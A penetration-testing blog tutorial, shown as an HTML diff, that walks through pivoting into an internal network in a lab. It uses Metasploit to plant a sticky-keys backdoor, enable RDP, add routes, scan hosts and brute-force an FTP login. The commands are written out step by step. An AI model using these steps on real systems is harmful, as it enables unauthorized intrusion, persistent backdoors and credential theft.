@@ -1,0 +1,89 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
+            <h1 class="post-title entry-title">FTP Pivoting through RDP</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/ftp-pivoting-rdp/" rel="bookmark"><time class="entry-date published" datetime="2017-09-29T16:47:37+00:00">September 29, 2017</time><time class="updated" datetime="2025-05-27T12:03:33+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In our previous tutorial we had discussed on <a href="http://www.hackingarticles.in/ssh-pivoting-using-meterpreter/"><strong>SSH pivoting</strong></a> &amp; <a href="http://www.hackingarticles.in/rdp-pivoting-metasploit/"><strong>RDP pivoting</strong></a> and today you will learn FTP pivoting attack.</span></p>
+<p><span style="color: #000000;">From Offensive Security</span></p>
+<p><span style="color: #000000;"><strong>Pivoting</strong> is a technique to get inside an unreachable network with help of pivot (center point). In simple words, it is an attack through which an attacker can exploit those systems which belong to the different network. For this attack, the attacker needs to exploit the main server that helps the attacker to add himself inside its local network and then the attacker will able to target the client system for the attack.</span></p>
+<p><span style="color: #000000;"><strong>Lab Setup requirement:</strong></span></p>
+<p><span style="color: #000000;"><strong>Attacker machine</strong>: Kali Linux</span></p>
+<p><span style="color: #000000;"><strong>Pivot Machine</strong>:  window operating system with <strong>two </strong>network interface</span></p>
+<p><span style="color: #000000;"><strong>Target Machine</strong>: window 7 (Allow FTP service)</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-mz_nS2XwzLI/Wc52FvT8qXI/AAAAAAAARtE/35FVXDn3UkcN8bVAxw3ibsJS4yDPiYUAwCLcBGAs/s1600/1.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploit pivot machine </strong></span></h3>
+<p><span style="color: #000000;">Use exploit MS17-010 or multi handler to hack the pivot machine and bypass its UAC to achieve admin privileges.</span></p>
+<pre class="lang:default decode:true">sessions</pre>
+<p><span style="color: #000000;"><strong> </strong>From the given image you can confirm that I owned a pivot machine (192.168.0.101) meterpreter sessions 1.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-uQovMrYXS-U/Wc52GpTa1FI/AAAAAAAARtY/EcQnEioc-eIkAccloIZSj6kYVHqYYIBTgCLcBGAs/s1600/2.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Launch the sticky key attack  </strong></span></h3>
+<p><span style="color: #000000;">Here I need to make post exploits to launch the sticky key attack </span></p>
+<pre class="lang:default decode:true">use post/windows/manage/sticky_keys
+msf post(sticky_keys) &gt; set session 1
+msf post(sticky_keys) &gt;exploit</pre>
+<p><span style="color: #000000;"><strong>Great!!</strong> It has successfully launched a sticky attack in pivot machine and now we will utilize it later for establishing a connection with the target FTP server.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ZFZF7a4wH2s/Wc52HHi4aJI/AAAAAAAARtc/cszQh_3xafkRI_OwSUjUSa9XXTqSAitfACLcBGAs/s1600/3.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Enable RDP service</strong></span></h3>
+<p><span style="color: #000000;">Open meterpreter session1 and type following command which will enable remote Desktop service in the pivoted machine. </span></p>
+<pre class="lang:default decode:true">meterpreter&gt; run getgui -e</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kSXnek5qSYA/Wc52HeO56AI/AAAAAAAARtg/EFKxLz_oAHYffIo6pshqLV06N-RkDHFTQCLcBGAs/s1600/4.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Verify the network interface of the pivot </strong></span></h3>
+<p><span style="color: #000000;">Check the network interface through the following command:</span></p>
+<pre class="lang:default decode:true">meterpreter&gt; ifconfig</pre>
+<p><span style="color: #000000;">From the given image you can observe two networks interface in pivot’s system <strong>1</strong><strong><sup>st</sup></strong><strong> </strong>for IP <strong>192.168.0.101 </strong>through which the attacker is connected and <strong>2</strong><strong><sup>nd</sup></strong> for IP <strong>192.168.100.102</strong> through which FTP server (targets) are connected.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-C9AuZRJVl3E/Wc52HjUwohI/AAAAAAAARtk/-Clvo-P-fAwrVbgOUBTrPpQ47VSI12v-wCLcBGAs/s1600/5.png"/></span></p>
+<h3><span style="color: #800000;">Autoroute</span></h3>
+<p><span style="color: #000000;">Since the attacker belongs to <strong>192.168.0.1</strong> interface and client belongs to <strong>192.168.100.0</strong> interface, therefore, it is not possible to directly make an attack on client network until unless the attacker acquires the same network connection. In order to achieve 192.168.100.0 network attacker need to run the <strong>post exploitation</strong> “autoroute”.</span></p>
+<p><span style="color: #000000;">This module manages session routing via an existing Meterpreter session. It enables other modules to ‘pivot’ through a compromised host when connecting to the named NETWORK and SUBMASK. Autoadd will search a session for valid subnets from the routing table and interface list then add routes to them. The default will add a default route so that all TCP/IP traffic not specified in the MSF routing table will be routed through the session when pivoting.</span></p>
+<pre class="lang:default decode:true">use post/multi/manage/autoroute 
+msf post(autoroute) &gt; set session 1
+msf post(autoroute) &gt; exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Rs-w8xKhNoY/Wc52H-CnBJI/AAAAAAAARts/9mZZ-eZL3zgRhIM1JUV6GnSIslzxN826gCLcBGAs/s1600/6.png"/></span></p>
+<h3><span style="color: #800000;">Ping Sweep</span></h3>
+<p><span style="color: #000000;">This module will perform IPv4 ping sweep using the OS included ping command.</span></p>
+<pre class="lang:default decode:true">use post/windows/gather/ping_sweep
+msf post(ping_sweep) &gt; set rhosts 192.168.100.1-110
+msf post(ping_sweep) &gt; set session 1
+msf post(ping_sweep) &gt; exploit</pre>
+<p><span style="color: #000000;"><strong> </strong>Here we found a new host IP <strong>192.168.100.103</strong> as shown in the given image. Let’s perform TCP port scan for activated services on this machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-frLRtllpfrM/Wc52H5DnN_I/AAAAAAAARto/avqQlY8Yuco_asSLo1lMaRQjHJGrWHThACLcBGAs/s1600/7.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Use TCP Port Scan</strong></span></h3>
+<p><span style="color: #000000;">This module Enumerates open TCP services by performing a full TCP connect on each port. This does not need administrative privileges on the source machine, which may be useful if pivoting.</span></p>
+<pre class="lang:default decode:true">use auxiliary/scanner/portscan/tcp
+msf auxiliary(tcp) &gt; set ports 21
+msf auxiliary(tcp) &gt; set rhosts 192.168.100.103
+msf auxiliary(tcp) &gt; set thread 10
+msf auxiliary(tcp) &gt;exploit</pre>
+<p><span style="color: #000000;">From given you can observe <strong>port 21</strong> is<strong> open </strong>and we know that 21 used for FTP services.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-tpVrVsX9RFw/Wc52IWXoJxI/AAAAAAAARtw/M3pF4JO-W80K_ohdQ3zJZ-Qrp9Dqoj1RQCLcBGAs/s1600/8.png"/></span></p>
+<h3><span style="color: #800000;"><strong>FTP Login Brute Force</strong></span></h3>
+<p><span style="color: #000000;">This module will test FTP logins on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.</span></p>
+<pre class="lang:default decode:true">use auxiliary/scanner/ftp/ftp_login
+msf auxiliary(ftp_login) &gt; set rhosts 192.168.100.103
+msf auxiliary(ftp_login) &gt; set user_file /root/Desktop/user.txt
+msf auxiliary(ftp_login) &gt; set pass_file /root/Desktop/pass.txt
+msf auxiliary(ftp_login) &gt; set stop_on_success true
+msf auxiliary(ftp_login) &gt; exploit</pre>
+<p><span style="color: #000000;">From the given image you can observe it is showing the matching combination of <strong>username: raj</strong> and <strong>password: 123</strong> for login.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-iB1lXtvHIsY/Wc52IluSqWI/AAAAAAAARt0/Bzquh9OnNEAim7JycGWm5296AH9lIgApQCLcBGAs/s1600/9.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Connect to pivot through RDP</strong></span></h3>
+<p><span style="color: #000000;">Open a new terminal in Kali Linux and type the following command to connect with pivot machine through RDP service</span></p>
+<pre class="lang:default decode:true">rdesktop 192.168.0.101</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-54amtrRbI6I/Wc52FgJSNfI/AAAAAAAARtM/w_sytqzqKLg-XKzt4HC052cQ1asWvV_FACLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">If you remember we had launched sticky attack above which will open a command prompt on logon screen when you will hit 5 times shift key.</span></p>
+<p><span style="color: #000000;">Now <strong>press 5 times to shift</strong> key then you will get command prompt and type “<strong>start iexplore.exe</strong>” which will lunch Internet Explore.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kOlPifhOvog/Wc52Fg9XijI/AAAAAAAARtI/xp_hzgq0Jqs7vdaka50u8t508xZ0dcPwACLcBGAs/s1600/11.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Connect with FTP server</strong></span></h3>
+<p><span style="color: #000000;">Execute the following URL in the browser for FTP connection:</span></p>
+<p><span style="color: #000000;"><a href="ftp://192.168.100.103"><strong>ftp://192.168.100.103</strong></a></span></p>
+<p><span style="color: #000000;"> Now enter the credential which we had found through FTP login brute force attack i.e. <strong>raj: 123</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-pO8HWcVKmkk/Wc52GQgdh5I/AAAAAAAARtQ/fSmscP0oetsw1t-8sp2Rdg8eFcS4TK1MQCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;"><strong>Congrats!!!</strong>  We are successfully connected with FTP server through pivot machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-7gC2J_BJRRo/Wc52GbgzKDI/AAAAAAAARtU/cQm623C6liQIq-9n9fqTHx02vmuU05EXQCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;"><strong> Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<a href="https://www.linkedin.com/in/aarti--singh/"> here</a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
